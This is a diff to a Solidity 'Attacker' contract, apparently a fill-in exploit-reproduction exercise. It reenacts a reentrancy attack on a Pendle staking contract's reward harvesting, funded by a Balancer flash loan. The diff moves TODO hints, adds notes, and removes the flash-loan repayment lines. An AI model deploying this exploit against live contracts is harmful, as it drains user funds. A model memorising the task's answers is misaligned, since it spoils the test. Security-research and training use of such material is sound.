@@ -197,11 +197,12 @@ contract Attacker is ERC20 {
                 );
             }
 
-            // TODO YOUR CODE HERE FOR FIRST DEPOSIT PENDLE_LPT_0x6010 (remember you need to get balance and approve first)
             // For first deposit you'll need:
             // - Get balance: IERC20(PENDLE_LPT_0x6010).balanceOf(address(this))
+            // NOTE: saved_bal is already defined for you at ~line 115 use it store the balance
             // - Approve: IERC20(PENDLE_LPT_0x6010).approve(PendleStaking_0x6e79, amount)
             // - Deposit: Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x6010, amount)
+            // TODO YOUR CODE HERE FOR FIRST DEPOSIT PENDLE_LPT_0x6010 (remember you need to get balance and approve first)
             saved_bal = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));
             IERC20(PENDLE_LPT_0x6010).approve(PendleStaking_0x6e79, saved_bal);
             // This deposit affects reward calculation that is still in progress
@@ -232,6 +233,7 @@ contract Attacker is ERC20 {
             }
 
             // TODO YOUR CODE HERE FOR SECOND DEPOSIT with PENDLE_LPT_0x038c following same process as previous deposit
+            // NOTE: Feel free to use any variable names here which you will need to define with uint256 var_name, do not reuse saved_bal
             uint256 bal_PENDLE_LPT_0x038c_this = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
             IERC20(PENDLE_LPT_0x038c).approve(PendleStaking_0x6e79, bal_PENDLE_LPT_0x038c_this);
             Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x038c, bal_PENDLE_LPT_0x038c_this);
@@ -294,7 +296,7 @@ contract Attacker is ERC20 {
         address[] memory _markets = new address[](1);
         _markets[0] = PENDLE_LPT;
 
-        // Trigger the vulnerable reward harvesting
+        // Trigger the vulnerable reward harvesting in the contract PendleStaking_0x6e79
         // This will call back into our claimRewards function
         // TODO YOUR CODE HERE: Trigger the vulnerable reward harvesting batchHarvestMarketRewards
         Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);
@@ -377,13 +379,12 @@ contract Attacker is ERC20 {
             );
         }
 
-        // Return flash loaned tokens to balancerVault
-        // Hint: rememeber we used saved_bal1, saved_bal2 to save the flash loaned amounts
-        // TODO YOUR CODE HERE: Return flash loaned tokens to balancerVault,
         IERC20(agETH).balanceOf(address(this));
-        IERC20(agETH).transfer(balancerVault, saved_bal1);
         IERC20(rswETH).balanceOf(address(this));
-        IERC20(rswETH).transfer(balancerVault, saved_bal2);
+
+        // Return flashloaned tokens agETH and rswETH to balancerVault
+        // Hint: rememeber we used saved_bal1, saved_bal2 to save the flash loaned amounts
+        // TODO YOUR CODE HERE: Return flash loaned tokens to balancerVault, IERC20(??).transfer(....)
     }
 }
 
